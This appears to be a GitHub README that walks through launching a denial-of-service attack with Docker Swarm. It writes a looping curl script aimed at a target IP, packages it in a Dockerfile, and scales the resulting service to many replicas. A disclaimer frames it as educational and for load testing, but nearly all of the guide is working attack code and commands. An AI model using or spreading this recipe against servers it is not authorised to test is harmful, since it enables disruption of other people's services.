# Docker-Swarm-DDOS
## How to create a Denial of Service Attack through Docker Swarm.
#### Quick Disclaimer: This information is for educational purposes only and should not be used with malicous intent. Also the following guide has been tested only for Mac and Ubuntu, minor differences might exist on other OS.

This repository will help you to create a DDOS attack on a server. This could be useful if working on a project and trying to test out what will happen if there is some traffic, heavy traffic or a full fleshed DDOS attack.

### List of Tasks

- [ ] Installing Docker
- [ ] Creating the Script
- [ ] Setting up Dockerfile
- [ ] Creating a Custom Docker Image
- [ ] Creating and Scaling a Service


### Installing Docker
If you have this part already complete feel free to move on to the next, otherwise here is a link that you could follow in order to get this part started.

Please instiall the proper verison for your OS and then return back to this guide. :+1:

https://www.docker.com/community-edition

- [x] Installing Docker

### Creating the Script
Now that we have Docker installed and running lets get started with creating a directory.
It doesnt matter where this directory is, but to keep in simple for now I'll go with this

```
$ mkdir $HOME/DockerAttack
$ cd $HOME/DockerAttack
```
>Following is done through iTerm or a Terminal
>I personally use vim for this, but any way would really do.
>$ vim curlAttack.sh
There's not much to the script, in fact its a simple looping curl, it looks something like this
```sh
while true
do
#Please use 'man curl' to see what -vk is for, also -X command can be useful too.
curl -vk https:://<ip>
#sleep 5
done
exit 0
```
> I'd actually reccomend to first write a curl command that works for your server in a terminal, then copy paste it into the script.

At this point you could test it out by adding execution permission and then running it.
```
$ chmod +x curlAttack.sh
$ ./curlAttack.sh
```

- [x] Creating the Script


### Setting up Dockerfile
Without switching to a different directory lets create our Dockerfile.

>$ vim Dockerfile
```
FROM tutum/curl
ADD curlAttack.sh /usr/local/bin/curlAttack.sh
CMD ["usr/local/bin/curlAttack.sh"]
```
- [ ] Setting up Dockerfile

### Creating a Custom Docker File

Now that dockerfile is set up properly, without switching into a different directory run the following command.
```
  $ docker build -t <imageName>:dockerfile .
```
Check if it was succesfull by running
 ```
 $ docker images
 ```
 
### Creating and Scaling a Service

Start all the following commands with **docker service**

| Command   | Description |
| ------------- | ------------- |
|  create --name \<serviceName> --detach=false \<imageName>:dockerfile | Creates a service from the custom dockerfile image.  |
| scale \<serviceName>=\<#>  | Used to easily scale number of copies of the service.  |

